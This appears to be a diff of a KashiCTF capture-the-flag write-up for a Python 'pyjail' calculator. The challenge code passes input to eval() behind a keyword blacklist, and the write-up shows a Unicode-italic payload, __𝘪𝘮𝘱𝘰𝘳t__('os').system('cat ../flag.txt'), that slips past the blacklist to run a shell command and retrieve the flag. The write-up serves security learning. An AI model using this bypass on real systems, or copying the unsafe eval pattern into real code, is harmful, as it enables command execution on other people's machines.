@@ -22,7 +22,7 @@ print(" \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|   ")
 
 BLACKLIST = ["open", "input", "eval", "exec", "import", "getattr", "sh", "builtins", "global"]
 def calc(op):
-	try : 	
+	try :
 		res = eval(op)
 	except Exception as e:
 		print(e)
@@ -34,7 +34,7 @@ def main():
 		inp = input(">> ")
 		if any(bad in inp for bad in BLACKLIST) :
 			print("Are you tying to hack me !!!!!")
-		else : 
+		else :
 			calc(inp)
 
 if __name__ == '__main__':
@@ -48,14 +48,15 @@ Looking at the [PyJail material online](https://shirajuki.js.org/blog/pyjail-che
 I make the following payload: `__𝘪𝘮𝘱𝘰𝘳t__('os').system('cat ../flag.txt')`
 
 Which then returns the flag from the remote:
+
 ```
 $ nc kashictf.iitbhucybersec.in 56261
-           _            _       _             
-          | |          | |     | |            
-  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __ 
+           _            _       _
+          | |          | |     | |
+  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __
  / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|
-| (_| (_| | | (__| |_| | | (_| | || (_) | |   
- \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|   
+| (_| (_| | | (__| |_| | | (_| | || (_) | |
+ \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|
 >> __𝘪𝘮𝘱𝘰𝘳t__('os').system('cat ../flag.txt')
 KashiCTF{C4N_S71LL_CL3AR_8L4CKL15T_ewBkDkyO}
 ```
